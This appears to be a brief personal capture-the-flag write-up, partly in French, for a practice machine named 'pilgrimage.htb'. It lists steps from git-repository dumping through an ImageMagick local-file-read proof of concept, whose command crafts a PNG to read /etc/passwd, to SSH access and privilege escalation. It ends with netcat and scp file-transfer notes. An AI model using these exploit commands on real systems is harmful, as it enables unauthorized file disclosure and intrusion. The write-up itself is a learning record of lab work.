
- scan nmap

-------
- git dumper 
```bash
git clone https://github.com/Ebryx/GitDump
python3 ./git-dump.py http://pilgrimage.htb/
```

------

- analyse code 

- run magic version

- search exploit in internet 
----
- install exploit

```bash
# clone the repo
git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc
cd imagemagick-lfi-poc

# installer pypng 
sudo python3 install pypng

# run the exploit
python3 generate.py -f "/etc/passwd" -o exploit.png
```
----
- test with passwd

- recover data

- test with db

- recover data 2 

- find ssh key 

- connect through ssh 

- find file 

- do privilege escalation

- find vector in ps -aux

- understand vector 

- find exploit 

- use exploit 

- get flag


-----
### Ce que j'ai Appris :

* file transfert avec ssh ou netcat
    ```bash
    # Syntax pour envoyer des fichier via ssh:
    # scp <source> <destination>

    #To copy a file from B to A while logged into B:
    scp /path/to/file username@a:/Path/to/destination

    #To copy a file from B to A while logged into A:
    scp username@b:/Path/to/file /path/to/destination

    #or
    # listenner
    nc -l -p <Port> > <Filename>

    # sender
    nc -v -w 2 -u <RecieverIp> -p <Port> < <Filename>
    ```
* processus listing 
    ```bash
    netstat -tnlp
    ```
* 
